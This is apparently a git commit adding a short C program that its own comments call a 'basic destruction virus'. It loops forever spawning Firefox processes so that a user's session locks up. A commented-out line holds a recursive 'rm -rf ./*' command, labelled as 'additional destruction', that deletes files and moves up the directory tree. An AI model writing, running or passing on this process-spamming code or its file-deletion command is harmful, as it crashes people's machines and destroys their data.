4d5295bd0553db32d90b4c4c51fa1d91ff7bf647
Gul'dan <92905002+K0K0SHA@users.noreply.github.com>
2022-08-24 04:01:27 -0400

    bullshit infinite loop

---
+++ bullshit.c
@@ -0,0 +1,21 @@
+#include <stdio.h>
+#include <stdlib.h>
+// filename: bullshit.c
+// file description: [source code] basic destruction virus 
+// destroys a live session by spam-spawning processes
+// disarm instructions: simply close terminal window
+
+int main() {
+
+	printf("welcome to the infinite loop, SUCKER!");
+
+	while(420>69){
+		system("firefox&"); 	     // spawns infinite firefoxes
+		//system("gedit&");	     // other ideas
+		//system("rm -rf ./* && cd .."); // additional destruction, even more with overwrite
+		//system("nemo&");
+		//system("nautilus&");
+		// more ideas: selection alg.
+		// terminal window spam
+	}
+}
